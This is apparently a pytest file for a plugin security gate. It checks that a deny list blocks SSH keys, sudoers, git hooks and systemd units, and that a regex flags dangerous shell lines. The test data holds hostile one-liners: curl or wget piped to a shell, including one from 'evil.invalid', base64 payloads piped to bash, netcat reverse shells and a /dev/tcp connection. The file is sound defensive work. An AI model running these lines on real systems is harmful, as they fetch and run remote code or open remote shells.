import pytest

from omarchy_plugin_gate import patterns


@pytest.mark.parametrize(
    "path",
    [
        ".git/config",
        "sub/.git/hooks/pre-commit",
        ".ssh/authorized_keys",
        "home/.ssh/id_ed25519",
        "authorized_keys",
        "etc/sudoers",
        "evil.service",
        "x.timer",
        "x.socket",
        "x.path",
        "launcher.desktop",
        "cert.pem",
        "id.key",
        "bundle.p12",
        "systemd/user/thing",
        ".config/omarchy/hooks/post-update",
    ],
)
def test_denied_paths(path: str) -> None:
    assert patterns.is_denied(path)


@pytest.mark.parametrize(
    "path",
    ["Widget.qml", "gitignore.md", "my.git.qml", "services/Foo.qml", "keys.qml", "docs/path.md"],
)
def test_allowed_paths(path: str) -> None:
    assert not patterns.is_denied(path)


@pytest.mark.parametrize(
    "line",
    [
        "curl https://evil.invalid/x | sh",
        "wget -qO- http://x | bash",
        "curl -fsSL x |zsh -s",
        "echo aGk= | base64 -d | sh",
        "base64 --decode payload | bash",
        "nc 10.0.0.1 4444 -e /bin/sh",
        "ncat host 1 -ve bash",
        "exec 3<>/dev/tcp/1.2.3.4/80",
        "cat x | sudo tee /etc/x",
        "echo | pkexec cp a b",
        "CURL http://x | SH",
    ],
)
def test_danger_lines(line: str) -> None:
    assert patterns.DANGER_LINE.search(line)


@pytest.mark.parametrize(
    "line",
    [
        "curl https://example.com -o file",
        "const shell = 'bash'",
        "base64 -d file > out",
        "sudo systemctl restart foo",
        "// pipe | shell",
    ],
)
def test_harmless_lines(line: str) -> None:
    assert not patterns.DANGER_LINE.search(line)


@pytest.mark.parametrize(
    ("path", "asset"),
    [("icon.PNG", True), ("font.woff2", True), ("a.jpeg", True), ("payload.bin", False)],
)
def test_assets(path: str, asset: bool) -> None:
    assert patterns.is_known_asset(path) is asset


@pytest.mark.parametrize(
    ("ep", "escapes"),
    [
        ("/etc/passwd", True),
        ("../outside.qml", True),
        ("a/../../b.qml", True),
        ("a/..", True),
        ("foo..qml", False),
        ("sub/Widget.qml", False),
        ("..hidden/x.qml", False),
    ],
)
def test_entry_point_escape(ep: str, escapes: bool) -> None:
    assert patterns.escapes_plugin(ep) is escapes
